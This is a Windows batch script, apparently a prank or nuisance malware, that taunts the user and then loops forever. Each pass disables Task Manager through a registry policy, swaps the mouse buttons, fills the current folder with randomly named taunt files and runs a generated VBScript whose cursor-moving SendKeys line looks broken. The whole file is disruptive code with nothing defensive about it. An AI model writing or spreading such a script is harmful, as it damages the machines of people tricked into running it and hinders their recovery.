@echo off

echo you sure?
pause
echo why tf would you not want ur computer
pause
echo lol ok
:i
@echo off
setlocal enabledelayedexpansion

:loop
rem Generate random X and Y coordinates
set /a "randX=%random% %% 1920"
set /a "randY=%random% %% 1080"
rem Use VBScript to move the cursor
echo Set objShell = CreateObject("WScript.Shell") > %temp%\movecursor.vbs
echo objShell.Run "cmd /c mode con:cols=20 lines=1 && timeout 1", 0, True >> %temp%\movecursor.vbs
echo objShell.SendKeys "^(%%{ESC}){HOME}+{!randX!}^{HOME}{!randY!}~" >> %temp%\movecursor.vbs
cscript //nologo %temp%\movecursor.vbs
del %temp%\movecursor.vbs
timeout /t 1 >nul
echo dont do anything stupid > %random%
echo DoNT dooooooooooooooo aNything StupID > %random%
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
echo 43785923452345
timeout /t 1 >nul
echo 34645645643657
timeout /t 1 >nul
echo 34534645645656
timeout /t 1 >nul
echo 34543523452354
timeout /t 1 >nul
echo 45434453464564
timeout /t 1 >nul
echo 456456456456546
timeout /t 1 >nul
echo 5645445676
timeout /t 1 >nul
echo 45656756547567
timeout /t 1 >nul
echo 67457645765
timeout /t 1 >nul
echo 476477665
timeout /t 1 >nul
echo 6647576
RUNDLL32 USER32.DLL,SwapMouseButton
goto i